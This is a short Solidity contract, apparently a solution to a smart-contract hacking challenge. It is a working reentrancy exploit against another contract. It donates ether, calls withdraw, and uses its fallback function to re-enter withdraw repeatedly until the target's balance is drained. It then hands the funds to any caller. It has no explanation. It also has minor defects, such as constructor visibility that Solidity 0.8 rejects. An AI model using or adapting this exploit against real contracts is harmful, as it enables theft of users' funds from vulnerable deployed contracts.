// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ReentrancyExploit {

    address payable public victimContract;

    constructor(address payable _victimContract) public payable {
        require(msg.value >= 1 ether, "You must send at least 1 ether.");
        victimContract = _victimContract;
        (bool success, bytes memory data) = victimContract.call{value: msg.value, gas: 3000000}(
            abi.encodeWithSignature("donate(address)", address(this))
        );
        require(success);
    }

    function pwn() public {
        (bool success, bytes memory data) = victimContract.call{gas: 3000000}(
            abi.encodeWithSignature("withdraw(uint256)", 1 ether)
        );
        require(success);
    }

    function withdraw() public {
        payable(msg.sender).transfer(address(this).balance);
    }

    fallback() external payable{
        uint amount;
        if(victimContract.balance > 1 ether) {
            amount = 1 ether;
        } else if(victimContract.balance < 1 ether && victimContract.balance > 0) {
            amount = victimContract.balance;
        }

        (bool success, bytes memory data) = victimContract.call{gas: 3000000}(
            abi.encodeWithSignature("withdraw(uint256)", amount)
        );

        require(success);
    }

}